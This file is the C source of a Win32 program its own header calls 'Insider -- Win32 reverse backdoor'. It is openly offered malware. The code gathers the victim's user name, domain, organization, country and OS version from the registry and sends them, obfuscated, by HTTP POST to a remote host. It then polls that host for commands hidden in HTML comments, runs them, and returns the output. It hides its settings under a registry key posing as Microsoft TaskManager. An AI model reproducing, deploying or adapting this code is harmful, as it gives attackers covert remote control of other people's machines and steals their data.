

/* Insider -- Win32 reverse backdoor */


#include "insider.h"
#include "md5.h"

int
WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
	char 		*r, *s, *p, *http, *r_str, *prefix;
	char 		cmd[4096], Data[1024], *buf, *dbuf;
	int 		c, d, error;
	int		found_proxy, found_cmd;
	HKEY 		Result;
	LONG 		Return;
	DWORD 		Regtype, Size;
	struct 		MD5Context md;
	unsigned char 	md5out[16];
	char		md5text[32];
	WSADATA 	wsaData;
	MSG 		msg;
	

	/* Get rid of the startup hourglass XXXXXXXXXXX win 9x ????? */
	if (IsWinNT())
		while (1) {
			c = PostThreadMessage(GetCurrentThreadId(), WM_NULL, 0, 0);
			if (c != 0) {
  				GetMessage(&msg, NULL, 0, 0);
				break;
			}
			Sleep(100);
		}

	/* Set up security descriptor */
	if (IsWinNT()) {
    		InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
    		SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    		sa.lpSecurityDescriptor = &sd;
	} else
  		sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;


	/* Open debugging file */
	if (DEBUG == 1) {
		debug = 1;
		dt = fopen(LOGFILE, "a+");
		if (dt == NULL)
			exit (1);
		fprintf(dt, "\n\n** Starting Insider, version %s\n", VERSION);
	} else
		debug = 0;

	/* Set global variables to default */
	url = URL;
	h_char = HOST;
	h_flag = PORT;
	prefix = PREFIX;
	encode = ENCODE;
	passwd = PASSWORD;
	i_flag = 0;
	min = MIN;
	max = MAX;
	retry = 0;
	used = 0;
	Logging = 0;
	Module = GetModuleHandle(NULL);
	if (!(cdir = strdup(STARTDIR)))
		exit (1);
	

	/* Start digging the system registry for useful information */
	Size = sizeof(Data);

	/* Identity */
	Return = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Identities"), 0,
		KEY_READ, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("Default User ID"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Identity = strdup(Data)))
				exit(1);
		} else {
			/* Use some other unique value XXXXXXXXXXXXXXXXXXXX */
			if (debug)
				fprintf(dt, "Oops, we have no identity..\n");
			exit (1);
		}
	} 
	RegCloseKey(Result);


	/* Insider registry data */
	Return = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\TaskManager"), 0,
		KEY_READ, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("Host"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(h_char = strdup(Data)))
				exit(1);
		}

		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("Port"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(h_flag = atoi(strdup(Data))))
				exit(1);
		}

		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("URL"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(url = strdup(Data)))
				exit(1);
		}

		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("Prefix"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(prefix = strdup(Data)))
				exit(1);
		}

		memset(Data, 0, Size);
		Return = RegQueryValueEx(Result, TEXT("Password"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(passwd = strdup(Data)))
				exit(1);
		}


	}
	RegCloseKey(Result);
	

	/* Country */
	Return = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), 0,
		KEY_READ, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("sCountry"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Country = strdup(Data)))
				exit(1);
		} else {
			Country = NULL;
		}

	}
	RegCloseKey(Result);


	/* UserAgent */
	Return = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"), 0,
		KEY_READ, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("User Agent"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(User_agent = strdup(Data)))
				exit(1);
		} else {
			User_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Win32)";
		}

	}
	RegCloseKey(Result);


	/* Version information */

	/* Win NT */
	if (IsWinNT())
		Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\MICROSOFT\\WINDOWS NT\\CurrentVersion"), 0,
			KEY_READ, &Result);
	/* Win 9x */
	else
		Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\MICROSOFT\\WINDOWS\\CurrentVersion"), 0,
			KEY_READ, &Result);
	if (Return == ERROR_SUCCESS) {

		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("RegisteredOrganization"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Organization = strdup(Data)))
				exit (1);
		} else {
			printf("Return: %d\n", Return);
			Organization = NULL;
		}

		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("RegisteredOwner"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Owner = strdup(Data)))
				exit (1);
		} else {
			printf("Return: %d\n", Return);
			Owner = NULL;
		}

		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("CSDVersion"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(SP = strdup(Data)))
				exit (1);
		} else {
			SP = NULL;
		}

		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("ProductName"),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Product = strdup(Data)))
				exit (1);
		/* NT4 (and NT3?) doesn't have ProductName */
		} else if (IsWinNT()){
			memset(Data, 0, Size);
			Size = sizeof(Data);
			Return = RegQueryValueEx(Result, TEXT("CurrentVersion"),
				NULL, &Regtype, &Data[0], &Size);
			if (Return == ERROR_SUCCESS) {
				memset(cmd, 0, sizeof(cmd));
				_snprintf(cmd, sizeof(cmd),"Microsoft Windows NT %s", Data);
				if (!(Product = strdup(cmd)))
					exit (1);
			} else
				Product = NULL;

		} else {
			Product = NULL;
		}
		
	}
	RegCloseKey(Result);


	/* Username and domain */

	/* Win NT */
	if (IsWinNT())
		Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\MICROSOFT\\WINDOWS NT\\CurrentVersion\\Winlogon"), 0,
			KEY_READ, &Result);
	/* Win 9x */
	else
		Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\MICROSOFT\\WINDOWS\\CurrentVersion\\Winlogon"), 0,
			KEY_READ, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("DefaultUserName"),
			NULL, &Regtype, Data, &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(User_name = strdup(Data)))
				exit (1);
		} else {
			User_name = NULL;
		}
		memset(Data, 0, Size);
		Size = sizeof(Data);
		Return = RegQueryValueEx(Result, TEXT("DefaultDomainName"),
			NULL, &Regtype, Data, &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Domain_name = strdup(Data)))
				exit (1);
		} else {
			Domain_name = NULL;
		}

	}
	RegCloseKey(Result);

	/* Check things out.. */

	if (Identity != NULL) {
		/* Initialize MD5 */
		MD5Init(&md);
		MD5Update(&md, Identity, strlen(Identity));
		MD5Final(md5out, &md);

		/* Print MD5 hash in string */
		for (c = 0, d = 0; c < 16; c++, d += 2) {
			_snprintf(&md5text[d], 32, "%02x", md5out[c]);
		}
		md5text[31] = '\0';
		if (debug)
			fprintf(dt, "** Identity: %s\n   MD5: %s\n", Identity, md5text);
	}

	/* Build information string */
	memset(cmd, 0, sizeof(cmd));
	_snprintf(cmd, sizeof(cmd),	"User: %s (%s)\n"
					"Logon domain: %s\n"
					"Location: %s (%s)\n"
					"System: %s (%s)\n",
					User_name ? User_name : "N/A",
					Owner ? Owner : "N/A",
					Domain_name ? Domain_name : "N/A",
					Organization ? Organization : "N/A",
					Country ? Country : "N/A",
					Product ? Product : "N/A",
					SP ? SP : "Default");
					
	if (!(info = strdup(cmd)))
		exit (1);
	if (debug) {
		fprintf(dt, "** System information\n%s\n", info);
		fflush(dt);
	}

initial:

	/* Prepare the first packet as info response */
	if (!(buf = strdup(info)))
		exit (1);
	used = strlen(buf);

	/* Encode */
	xor(buf);
	p = b64enc(buf, used);
	free(buf);

	/* Initialize response payload */
	r_str=p;
	
	/* Enter main loop */
	while (1) {

		if (debug)
			fprintf(dt, "** Sending http payload\n");

		c = strlen(md5text) + strlen(r_str) + 4;
		if (!(dbuf = (char *)malloc(c)))
			exit (1);
		memset(dbuf, 0, c);
		_snprintf(dbuf, c, "%s;%s\r\n", md5text, r_str);

		/* Free response string pointer */
		free(r_str);

		/* send message */
		http = send_msg(url, dbuf, h_char, h_flag, 
			HTTP_METHOD_POST);
	
		/* Free dynamic pointer */
		free(dbuf);

		/* Mark down the http payload start address */
		s = http;

		if (debug)
			fprintf(dt, "** Server returned status %d\n", http_status);

		/* Something went wrong */
		if (s == NULL) {
			/* Empty return string */
			if (retry)
				goto initial;
			else {
				r_str = "";
				goto finish;
			}
		}

		/* 
		 * Parse the html page and look for html comment
		 * <!-- PREFIX _cmd_ -->
		 */
		found_cmd = 0;
		for (; *http != '\0'; http++) {
			if (!strncmp(http, prefix, strlen(prefix))) {
				http += strlen(prefix);
				found_cmd = 1;
				break;
			}
        	}
		/* Run the requested command and return results */
		if (found_cmd == 1) {
			p = http;

			/* Cut down the command string */
			while (*p++ != '\0')
				if (*p == ' ')
					*p = '\0';

			/* Base64-decode and xor-decode */
			p = b64dec(http, strlen(http));
			xor(p);

			/* Remove newline */
			r = p;
			while (*r != '\0') {
				if ((*r == '\r') || (*r == '\n'))
					*r = '\0';
				r++;
			}
			
			/* Run the command */
			buf = (char *)run_command(p);
			if (buf == NULL) {
				r_str = "";
				goto finish;
			}
			free(p);

			/* Encode */
			xor(buf);

			/* We may have to reset encode after file download.. */
			if (ENCODE == 1) encode = 1;

			/* Base64-encode */
			p = b64enc(buf, used);
			free(buf);

			/* Initialize response payload */
			r_str=p;

		/* No command to run, return a simple poll: */
		} else {
			r_str = "";
		}
finish:

		/* Free the html pointer */
		free(s);

		/* Trim memory usage (otherwise the process just grows and grows...) */
		if (IsWinNT())
			SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);
		
		/* Sleep for random time between min and max */
		
		/* Determine sleep time */
		i_flag = min + (rand() % (max-min));

		if (debug) {
			fprintf(dt,"** Waiting for %d secs\n", i_flag);
			fflush(dt);
		}
		_sleep(i_flag*1000);

	}
	if (debug) fflush(dt);

	return (0);

}

/* Are we running winnt? */
BOOL IsWinNT() {
	OSVERSIONINFO osv;
	osv.dwOSVersionInfoSize = sizeof(osv);
	GetVersionEx(&osv);
	return (osv.dwPlatformId == VER_PLATFORM_WIN32_NT);
}



/* XOR encode/decode with password */

void xor(char *data) {
	unsigned char *p, *t;

	if (!encode) return;
	t = data;
	p = passwd;
	for (;*t != '\0'; t++) {
		if (*p == '\0') p = passwd;
		/* Make sure that there's no printable char - add dec 128 */
		*t ^= *(p++) + 128;
	}

}
